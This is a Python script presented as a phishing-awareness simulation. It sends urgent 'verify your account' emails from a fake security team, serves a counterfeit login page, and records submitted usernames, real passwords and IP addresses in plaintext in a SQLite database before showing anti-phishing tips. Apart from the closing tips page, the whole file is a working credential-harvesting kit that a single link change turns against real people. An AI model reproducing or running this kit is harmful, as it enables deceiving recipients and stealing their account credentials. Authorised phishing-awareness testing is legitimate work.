import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, request, redirect
import sqlite3
from datetime import datetime
from reportlab.pdfgen import canvas
import os

# ========== CONFIGURATION ==========
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "your email"
EMAIL_PASSWORD = "ur password"
TARGET_EMAILS = ["email1", "05539y899c@spymail.one"]
PHISHING_LINK = "http://127.0.0.1:5000/login"
DATABASE = "phishing_simulation.db"
REPORT_FILE = "Phishing_Report.pdf"

# ========== SETUP DATABASE ==========
def setup_database():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_responses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            password TEXT,
            ip_address TEXT,
            timestamp TEXT
        )
    ''')
    conn.commit()
    conn.close()

# ========== EMAIL SIMULATION ==========
def send_phishing_emails():
    print("[*] Sending phishing emails...")
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

    for recipient in TARGET_EMAILS:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = recipient
        msg['Subject'] = "Urgent: Verify Your Account Details"

        # Email body
        body = f"""
        <html>
            <body>
                <p>Dear User,</p>
                <p>We detected suspicious activity on your account. To protect your account, we have temporarily restricted access to certain features.</p>
                <p>To regain full access, please verify your account details within <b>24 hours</b>. Failure to do so will result in permanent account suspension.</p>
                <p>Click on the link below to verify your account:</p>
                <p><a href="{PHISHING_LINK}" style="color:blue; text-decoration:none;">Verify Account</a></p>
                <p>Thank you for your prompt attention to this matter.</p>
                <p>Sincerely,<br><b>Security Team</b></p>
            </body>
        </html>
        """
        msg.attach(MIMEText(body, 'html'))

        try:
            server.sendmail(EMAIL_ADDRESS, recipient, msg.as_string())
            print(f"[*] Email sent to {recipient}")
        except smtplib.SMTPDataError as e:
            print(f"[!] Failed to send email to {recipient}: {e}")
        except Exception as e:
            print(f"[!] An unexpected error occurred: {e}")

    server.quit()
    print("[*] Phishing emails sent.")


# ========== WEB SERVER ==========
app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.remote_addr
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        store_response(username, password, ip_address, timestamp)
        return redirect("/educational_feedback")
    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f3f3f3;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-container {
                    background: white;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
                    text-align: center;
                    width: 300px;
                }
                .login-container h2 {
                    margin-bottom: 20px;
                    color: #333;
                }
                .login-container input[type="text"],
                .login-container input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin: 10px 0;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                }
                .login-container button {
                    background-color: #007bff;
                    color: white;
                    padding: 10px 15px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    width: 100%;
                }
                .login-container button:hover {
                    background-color: #0056b3;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Secure Login</h2>
                <form action="/login" method="POST">
                    <input type="text" name="username" placeholder="Username" required><br>
                    <input type="password" name="password" placeholder="Password" required><br>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
    '''

@app.route('/educational_feedback')
def educational_feedback():
    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Educational Feedback</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f9f9f9;
                    color: #333;
                    margin: 20px;
                    line-height: 1.6;
                }
                h2 {
                    color: #007bff;
                }
                ul {
                    background-color: #fff;
                    padding: 20px;
                    border: 1px solid #ddd;
                    border-radius: 8px;
                    list-style-type: square;
                }
                li {
                    margin-bottom: 10px;
                }
                .resources {
                    margin-top: 20px;
                }
                .resources a {
                    color: #007bff;
                    text-decoration: none;
                }
                .resources a:hover {
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>
            <h2>Phishing Simulation Completed</h2>
            <p>This was a simulated phishing attack conducted to help you recognize and avoid real-world phishing attempts. Below are some key tips to protect yourself:</p>
            <ul>
                <li><strong>Verify the sender:</strong> Check the sender's email address closely for any inconsistencies or unusual domains.</li>
                <li><strong>Examine URLs:</strong> Hover over links to preview their actual destination before clicking. Be cautious of shortened URLs or links with slight misspellings.</li>
                <li><strong>Beware of urgency:</strong> Scammers often use urgent or threatening language to pressure you into acting quickly.</li>
                <li><strong>Check for generic greetings:</strong> Legitimate organizations often address you by name, not with generic terms like "Dear User."</li>
                <li><strong>Look for spelling errors:</strong> Phishing emails often contain grammatical mistakes or spelling errors, which are red flags.</li>
                <li><strong>Enable multi-factor authentication (MFA):</strong> Use MFA wherever possible to add an extra layer of security to your accounts.</li>
                <li><strong>Never share sensitive information:</strong> Legitimate organizations will never ask for passwords, credit card numbers, or other sensitive details via email.</li>
            </ul>
            <div class="resources">
                <h3>Additional Resources</h3>
                <p>For more information on recognizing phishing scams, visit the following links:</p>
                <ul>
                    <li><a href="https://www.consumer.ftc.gov/articles/how-recognize-and-avoid-phishing-scams" target="_blank">FTC: How to Recognize and Avoid Phishing Scams</a></li>
                    <li><a href="https://www.cisa.gov/sites/default/files/publications/Cybersecurity-Phishing-Tip-Sheet.pdf" target="_blank">CISA: Phishing Tip Sheet (PDF)</a></li>
                </ul>
            </div>
        </body>
        </html>
    '''


# ========== DATA STORAGE ==========
def store_response(username, password, ip_address, timestamp):
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO user_responses (username, password, ip_address, timestamp)
        VALUES (?, ?, ?, ?)
    ''', (username, password, ip_address, timestamp))
    conn.commit()
    conn.close()
    print(f"[*] Stored response from {ip_address} at {timestamp}")

# ========== REPORT GENERATION ==========
def generate_report():
    print("[*] Generating report...")
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM user_responses")
    responses = cursor.fetchall()
    conn.close()

    c = canvas.Canvas(REPORT_FILE)
    c.drawString(100, 800, "Phishing Simulation Report")
    c.drawString(100, 780, f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    c.drawString(100, 760, "Results:")
    
    y = 740
    for response in responses:
        id, username, password, ip_address, timestamp = response
        c.drawString(100, y, f"ID: {id}, Username: {username}, IP: {ip_address}, Timestamp: {timestamp}")
        y -= 20

    c.save()
    print(f"[*] Report saved as {REPORT_FILE}")

# ========== MAIN FUNCTION ==========
if __name__ == '__main__':
    setup_database()
    send_phishing_emails()
    print("[*] Starting web server. Visit http://127.0.0.1:5000/login to test.")
    try:
        app.run(port=5000)
    except KeyboardInterrupt:
        print("\n[*] Stopping web server...")
        generate_report()
        print("[*] Done.")
